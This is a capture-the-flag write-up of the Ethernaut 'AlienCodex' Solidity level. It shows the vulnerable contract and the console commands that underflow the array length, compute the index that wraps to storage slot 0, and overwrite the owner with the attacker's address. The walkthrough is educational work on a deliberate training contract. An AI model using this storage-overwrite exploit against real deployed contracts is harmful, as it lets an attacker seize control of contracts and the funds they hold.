# Ehternaut 19: Alien Code

Understanding storage

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

This exercise is about storage layout and overflow. It is stated that we need to claim ownership.

This smart contract implements the [ownable interface]([https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol). When solidity compiles a smart contract it compiles the imports first. Meaning as well that the storage variables of the import claim the first storage slots. In our case `address private _owner;` claims storage slot 0. This will be important later.

I hope to work fully through with Ethernaut in the browsers developer console. First step seems obvious - to make the functions `record, retract, revise` work the assert statement of the modifier contacted needs to be true. In our case this means set contacted to true:

```apache
await contract.make_contact()
```

That was easy. Since I do not know what to record and what to revise, I try the retract function first

```apache
await contract.retract()
```

What happend now? This function changed the length of an array. This is done automatically with solidity normally and its no assembly code, so this is a bug! I know that dynamic arrays are stored in solidity that at the storage slot of the dynamic array is the length of the array. The elements are stored at keccac256(storage slot) upwards. So I want to check what is in the storage slot through ethernaut.

Arg. I needed to check before calling the retract function the content of the storage slot. I do this now on another instance of ethernaut. I execute the command:

```apache
await web3.eth.getStorageAt(contract.address, 1)
```

before the retract function call and receive **0x0000000000000000000000000000000000000000000000000000000000000000**

and after calling retract() and receive **0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff**

This means an underflow just happend here and our length is as long as the max value. It seems to be possible now that I can access any element, which might mean I can add my address to the ownable storage variable through this array - haha. But is this really possible?

```apache
await web3.eth.getStorageAt(contract.address, 0)
await contract.owner()
```

gives in my case 0x00000000000000000000000040055e69e7eb12620c8ccbccab1f187883301c30 before calling the function make_contact(), 0x00000000000000000000000140055e69e7eb12620c8ccbccab1f187883301c30 after calling make_contact().

The second call 0x40055E69E7EB12620c8CCBCCAb1F187883301c30. Here we see very nicley that the compiler pushed the address and the contact boolean together in the storage slot 0, from right to left in the word, in order of the variable appearance in code.

So I need to recreate storage location zero with my address with leading 10 bytes of zero values -> 20 0 hex. This will be the content of the revise function parameter. But what will be the index??

For this to answer I revisit the storage position of the elements of the dynamic array. The [solidity documentation](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays) says:

> Assume the storage location of the mapping or array ends up being a slot\*\* **`p`** **after applying the storage layout rules. For dynamic arrays, this slot stores the number of elements in the array [...] **
>
> **Array data is located starting at** **`keccak256(p)`** \*\*and it is laid out in the same way as statically-sized array data would [...]

In short keccac256(storage slot 1) + index gives us access to the data. So how do we hack our exercise? If our length is now:

length: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

Assuming that I can have the length element, the question is where the array stores the value, and this is keccak256(1). When I now substract this form the length value I receive the maximum number of array data I can store, before an overflow happens.

And this is exactly what we want after the overflow what number comes then? 0. Bingo! this is the storage slot we want to overwrite.

```apache
web3.utils.BN('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')
  .sub(web3.utils.BN(web3.utils.soliditySha3(1)))
  .add(web3.utils.BN(1))
  .toString()
```

resulting in the value of `35707666377435648211887908874984608119992236509074197713628505308453184860938` This is our hacked position of the 0 storage slot ;-).

Time to call now the revise function:

```apache
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000001YOUR_EOA')
```

Done 🎉️🎉️🎉️🎉️🎉️🎉️
